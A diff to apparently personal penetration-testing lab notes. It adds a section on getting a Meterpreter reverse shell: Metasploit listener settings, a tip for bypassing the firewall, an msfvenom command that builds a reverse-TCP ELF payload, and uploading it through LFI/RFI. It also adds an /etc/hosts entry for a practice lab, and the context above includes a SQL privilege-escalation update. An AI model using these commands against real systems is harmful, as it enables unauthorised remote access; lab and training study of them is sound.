@@ -191,6 +191,35 @@ Change table entry values
 > update users set adm="yes" where username="tracking1";
 ```
 
+## Meterpreter reverse shell
+
+1. Find vulnerability in target (e.g. LFI/RFI)
+2. Set up a Metasploit listener
+```
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp # or any payload you wish
+set lhost <MY IP>
+set lport <PORT>  # set to a port open on the target to bypass firewall
+run
+```
+
+3. Create a matching meterpreter-based executable using msfvenom
+```
+msfvenon -p linux/x64/meterpreter_reverse_tcp lhost=<MY IP> lport=<PORT> -f elf -o meter
+```
+
+4. Upload the payload to target (e.g LFI/RFI)
+
+## Adding Virtual Hosts
+
+In the black box practice labs, we had to add a virtual host to /etc/hosts in
+order to connect to the webpage.
+
+```
+$ sudo vim /etc/hosts
+<IP addr>	static.foobar.org
+```
+
 ## Misc
 
 - Found a webshell/admin panel on a site?
